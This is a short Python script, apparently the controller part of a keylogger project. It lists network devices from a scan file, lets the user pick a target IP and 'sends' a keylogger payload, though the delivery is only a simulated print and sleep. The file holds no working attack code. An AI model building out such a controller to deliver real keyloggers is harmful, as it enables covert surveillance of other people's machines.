import json
import os
from time import sleep

DEVICES_FILE = os.path.join(os.path.dirname(__file__), "devices.json")
CONFIG_FILE = os.path.join(os.path.dirname(__file__), "config.json")
PAYLOAD_PATH = "../payloads/target/release/payloads"  # Adjust if needed

def load_devices():
    if not os.path.exists(DEVICES_FILE):
        print("[!] No devices.json found. Run net_scanner.py first.")
        return []

    with open(DEVICES_FILE) as f:
        return json.load(f)

def display_devices(devices):
    if not devices:
        print("[!] No devices found.")
        return

    print("\nDiscovered Devices:")
    for idx, d in enumerate(devices, 1):
        print(f"{idx}. IP: {d['ip']}   MAC: {d['mac']}")

def send_payload(ip):
    print(f"[*] Sending keylogger payload to {ip} ...")
    # Simulated for now:
    sleep(2)
    print(f"[+] Payload delivered to {ip} (simulation)")

def save_config(ip):
    config = {"ip": ip}
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

def main():
    print("Starting keylogger controller...")

    devices = load_devices()
    if not devices:
        return

    display_devices(devices)

    try:
        choice = int(input("\nSelect target number to send payload to: ")) - 1
        if choice < 0 or choice >= len(devices):
            print("[!] Invalid selection.")
            return

        target_ip = devices[choice]['ip']
        print(f"\n[+] Selected Target: {target_ip}")
        save_config(target_ip)
        send_payload(target_ip)

    except ValueError:
        print("[!] Invalid input. Enter a number.")

if __name__ == "__main__":
    main()

